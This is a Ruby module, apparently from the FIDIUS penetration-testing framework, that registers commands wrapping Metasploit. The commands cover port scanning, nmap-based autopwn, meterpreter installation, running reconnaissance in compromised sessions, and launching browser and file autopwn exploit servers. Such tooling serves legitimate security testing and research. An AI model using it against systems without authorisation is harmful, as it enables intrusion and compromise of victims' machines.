# @deprecated This module will be splitted into serveral (useful)
#             submodules.
module FIDIUS::MsfWorker::CommandPool
  # Will run the autopwn'ing.
  #
  # Call sequence:
  #   cmd_nmap(:args => [], :task => nil)
  #
  # @param [Array] args  Arguments.
  # @param [Task] task  A Task ActiveRecord.
  FIDIUS::MsfWorker.register_command :nmap do |options|
    args = options[:args]
    task = options[:task]
    manager = FIDIUS::MsfPlugin::AutoPwn.new @framework, args[0]
    manager.run_nmap
  end

  # Not documentated yet.
  #
  # Call sequence:
  #   cmd_session_install(:args => [], :task => nil)
  #
  # @param [Array] args  Arguments.
  # @param [Task] task  A Task ActiveRecord.
  FIDIUS::MsfWorker.register_command :session_install do |options|
    args = options[:args]
    task = options[:task]
    session = get_session_by_uuid @framework.sessions, args[0]
    return unless session
    return unless session.type == 'meterpreter'
    FIDIUS::Session::install_meterpreter(session)
  end

  # Not documentated yet.
  #
  # Call sequence:
  #   cmd_exec_reconnaissance(:args => [], :task => nil)
  #
  # @param [Array] args  Arguments.
  # @param [Task] task  A Task ActiveRecord.
  FIDIUS::MsfWorker.register_command :exec_reconnaissance do |options|
    args = options[:args]
    task = options[:task]
    begin
      session = get_session_by_uuid @framework.sessions, args[0]
      script_path = File.join 'fidius', 'reconnaissance', 'reconnaissance'
      session.execute_file(script_path, args)
    rescue
      puts $!
    end
  end
  
  # Not documentated yet.
  #
  # Call sequence:
  #   cmd_tcp_scanner(:rhost => "", :ports => '1-10000')
  #
  # @param [String] rhost  Msf3 RHOST value.
  # @param [String] ports  A port range.
  FIDIUS::MsfWorker.register_command :tcp_scanner do |options|
    rhost = options[:rhost]
    ports = options[:ports] || '1-10000' # Range? 1..10000
    options = {'RHOSTS' => rhost, 'PORTS' => ports }
    run_exploit "auxiliary/scanner/portscan/tcp", options
  end

  # Not documentated yet.
  #
  # Call sequence:
  #   cmd_start_browser_autopwn(:args => [], :task => nil)
  #
  # @param [Array] args  Arguments.
  # @param [Task] task  A Task ActiveRecord.
  FIDIUS::MsfWorker.register_command :start_browser_autopwn do |options|
    args = options[:args]
    task = options[:task]
    options = {'LHOST' => args[0], 'SRVHOST' => args[0], 'URIPATH' => '/' }
    run_exploit "server/browser_autopwn", options
  end

  # Not documentated yet.
  #
  # Call sequence:
  #   cmd_start_browser_autopwn(:args => [], :task => nil)
  #
  # @param [Array] args  Arguments.
  # @param [Task] task  A Task ActiveRecord.
  FIDIUS::MsfWorker.register_command :start_file_autopwn do |options|
    args = options[:args]
    task = options[:task]
    options = {'LHOST' => args[0], 'SRVHOST' => args[0], 'URIPATH' => 'file' }
    run_exploit "server/file_autopwn", options
  end

end

class FIDIUS::MsfWorker
  include FIDIUS::MsfWorker::CommandPool
end
